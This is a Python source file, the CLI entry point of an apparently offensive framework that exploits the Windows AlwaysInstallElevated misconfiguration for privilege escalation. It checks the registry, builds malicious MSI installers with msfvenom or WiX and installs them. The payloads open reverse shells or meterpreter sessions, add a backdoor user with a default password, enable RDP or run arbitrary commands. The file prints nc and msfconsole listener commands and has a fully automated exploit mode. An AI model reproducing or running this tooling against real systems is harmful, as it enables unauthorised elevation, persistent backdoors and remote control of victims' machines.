"""
AlwaysInstallElevated Exploitation Framework - Main CLI Entry Point

A modular framework for detecting and exploiting the AlwaysInstallElevated
Windows misconfiguration for privilege escalation.

Usage:
    python aie_exploit.py --check                    # Check if vulnerable
    python aie_exploit.py --generate msfvenom --lhost IP --lport PORT
    python aie_exploit.py --generate wix --type add_user
    python aie_exploit.py --exploit path/to/malicious.msi
    python aie_exploit.py --auto --lhost IP --lport PORT
"""

import argparse
import sys
from pathlib import Path

# Add parent directory to path for imports
sys.path.insert(0, str(Path(__file__).parent))

from core import RegistryChecker
from core import MSIExploiter
from payloads.msfvenom import MsfvenomPayload
from payloads.wix import WixPayload
from .utils.helpers import print_banner, print_status


def auto_exploit(lhost: str, lport: int, output_dir: str = "msi_exploits"):
    """
    Automated AlwaysInstallElevated exploitation.

    Args:
        lhost: Attacker IP address
        lport: Attacker listening port
        output_dir: Output directory for generated files
    """
    print("\n" + "=" * 60)
    print("AUTOMATED ALWAYSINSTALLELEVATED EXPLOITATION")
    print("=" * 60)

    # Check vulnerability
    checker = RegistryChecker(output_dir)

    if not checker.is_vulnerable():
        print("\n[-] System is NOT vulnerable to AlwaysInstallElevated")
        return False

    print("\n[+] System is VULNERABLE! Proceeding with exploitation...")

    # Generate payload
    print("\n[*] Generating malicious MSI...")

    generator = MsfvenomPayload(output_dir)
    msi_path = generator.generate_reverse_shell(lhost, lport)

    if not msi_path:
        print("[-] Failed to generate MSI payload")
        print("[*] Trying WiX template instead...")

        wix_gen = WixPayload(output_dir)
        wxs_path = wix_gen.generate_reverse_shell_template(lhost, lport)

        print(f"\n[!] WiX source generated: {wxs_path}")
        print("[!] Manual compilation required - see instructions above")
        return False

    # Exploit
    print(f"\n[*] MSI payload ready: {msi_path}")
    print(f"\n[!] Start listener before continuing:")
    print(f"    nc -lvnp {lport}")
    print(f"    # OR")
    print(
        f"    msfconsole -x 'use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST {lhost}; set LPORT {lport}; run'")

    input("\n[*] Press Enter when listener is ready...")

    exploiter = MSIExploiter(output_dir)
    success, msg = exploiter.exploit(msi_path, verify_first=False)

    if success:
        print(f"\n[+] Exploitation successful!")
        print(f"[+] Check your listener for incoming connection")
        return True
    else:
        print(f"\n[-] Exploitation failed: {msg}")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="AlwaysInstallElevated Exploitation Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  Check if system is vulnerable:
    python aie_exploit.py --check

  Generate msfvenom reverse shell MSI:
    python aie_exploit.py --generate msfvenom --lhost 192.168.1.100 --lport 4444

  Generate WiX add-user MSI template:
    python aie_exploit.py --generate wix --type add_user --username backdoor

  Generate WiX reverse shell template:
    python aie_exploit.py --generate wix --type reverse_shell --lhost 192.168.1.100 --lport 4444

  Install a malicious MSI:
    python aie_exploit.py --exploit /path/to/malicious.msi

  Fully automated exploitation:
    python aie_exploit.py --auto --lhost 192.168.1.100 --lport 4444
        """
    )

    # Assessment options
    assess_group = parser.add_argument_group('Assessment')
    assess_group.add_argument('--check', action='store_true',
                              help='Check if AlwaysInstallElevated is enabled')
    assess_group.add_argument('--report', action='store_true',
                              help='Generate a vulnerability report')

    # Generation options
    gen_group = parser.add_argument_group('Payload Generation')
    gen_group.add_argument('--generate', '-g', type=str,
                           choices=['msfvenom', 'wix'],
                           help='Generate malicious MSI payload')
    gen_group.add_argument('--type', '-t', type=str,
                           choices=['reverse_shell', 'meterpreter', 'add_user',
                                    'enable_rdp', 'exec', 'custom'],
                           default='reverse_shell',
                           help='Payload type (for generation)')

    # Payload options
    payload_group = parser.add_argument_group('Payload Options')
    payload_group.add_argument('--lhost', type=str,
                               help='LHOST for reverse connections')
    payload_group.add_argument('--lport', type=int, default=4444,
                               help='LPORT for reverse connections')
    payload_group.add_argument('--username', '-u', type=str, default='hacker',
                               help='Username for add_user/enable_rdp')
    payload_group.add_argument('--password', '-p', type=str, default='Password123!',
                               help='Password for new user')
    payload_group.add_argument('--command', '-c', type=str,
                               help='Command for exec/custom payload')
    payload_group.add_argument('--arch', choices=['x64', 'x86'], default='x64',
                               help='Architecture for msfvenom payloads')

    # Exploitation options
    exploit_group = parser.add_argument_group('Exploitation')
    exploit_group.add_argument('--exploit', '-e', type=str,
                               help='Path to MSI file to install')
    exploit_group.add_argument('--auto', action='store_true',
                               help='Fully automated exploitation')
    exploit_group.add_argument('--no-verify', action='store_true',
                               help='Skip vulnerability verification')

    # General options
    general_group = parser.add_argument_group('General')
    general_group.add_argument('--output-dir', '-o', type=str, default='msi_exploits',
                               help='Output directory')
    general_group.add_argument('--quiet', '-q', action='store_true',
                               help='Suppress banner output')

    args = parser.parse_args()

    # Show banner unless quiet
    if not args.quiet:
        print_banner()
        print_status()

    # Handle check
    if args.check:
        checker = RegistryChecker(args.output_dir)
        vulnerable = checker.is_vulnerable()

        if args.report:
            checker.export_report()

        sys.exit(0 if vulnerable else 1)

    # Handle report only
    if args.report:
        checker = RegistryChecker(args.output_dir)
        checker.export_report()
        sys.exit(0)

    # Handle auto exploitation
    if args.auto:
        if not args.lhost:
            print("[-] --lhost required for auto exploitation")
            sys.exit(1)

        success = auto_exploit(args.lhost, args.lport, args.output_dir)
        sys.exit(0 if success else 1)

    # Handle payload generation
    if args.generate:
        if args.generate == 'msfvenom':
            generator = MsfvenomPayload(args.output_dir)

            if args.type == 'reverse_shell':
                if not args.lhost:
                    print("[-] --lhost required for reverse_shell")
                    sys.exit(1)
                generator.generate_reverse_shell(
                    args.lhost, args.lport, args.arch
                )

            elif args.type == 'meterpreter':
                if not args.lhost:
                    print("[-] --lhost required for meterpreter")
                    sys.exit(1)
                generator.generate_meterpreter(
                    args.lhost, args.lport, args.arch
                )

            elif args.type == 'exec':
                if not args.command:
                    print("[-] --command required for exec")
                    sys.exit(1)
                generator.generate_exec(args.command)

        elif args.generate == 'wix':
            generator = WixPayload(args.output_dir)

            if args.type == 'add_user':
                generator.generate_add_user_template(
                    args.username, args.password
                )

            elif args.type == 'reverse_shell':
                if not args.lhost:
                    print("[-] --lhost required for reverse_shell")
                    sys.exit(1)
                generator.generate_reverse_shell_template(
                    args.lhost, args.lport
                )

            elif args.type == 'enable_rdp':
                generator.generate_enable_rdp_template(
                    args.username, args.password
                )

            elif args.type == 'custom':
                if not args.command:
                    print("[-] --command required for custom")
                    sys.exit(1)
                generator.generate_custom_command_template(args.command)

    # Handle exploitation
    elif args.exploit:
        exploiter = MSIExploiter(args.output_dir)
        success, msg = exploiter.exploit(
            args.exploit,
            verify_first=not args.no_verify
        )
        print(f"\n[{'SUCCESS' if success else 'FAILED'}] {msg}")
        sys.exit(0 if success else 1)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()